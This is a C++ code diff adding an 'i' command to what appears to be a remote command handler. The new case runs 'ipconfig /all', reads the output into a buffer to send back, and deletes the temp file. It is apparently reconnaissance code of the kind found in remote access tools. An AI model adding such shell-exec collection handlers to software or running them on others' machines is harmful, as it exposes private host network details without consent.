@@ -13,6 +13,30 @@ void processCommand(std::vector<char> buffer, std::vector<char>& outputBuffer)
 		//The outputBuffer has all the files and directory information listed
 		listFiles(outputBuffer, directory);
 		break;
+
+	case 'i':
+		//Calls function for using ipconfig /all command
+		exec("ipconfig /all > ipconfig.txt");
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+		std::ifstream ipconfig("ipconfig.txt");
+		std::string line;
+		std::string newLine = "\n";
+
+		if (ipconfig.is_open())
+		{
+			while (std::getline(ipconfig, line))
+			{
+				std::copy(line.begin(), line.end(), std::back_inserter(outputBuffer));
+				std::copy(newLine.begin(), newLine.end(), std::back_inserter(outputBuffer));
+			}
+			ipconfig.close();
+			exec("del /f ipconfig.txt");
+		}
+		else
+		{
+			std::cout << "Unable to open file..." << std::endl;
+		}
+
 	}
 }
 
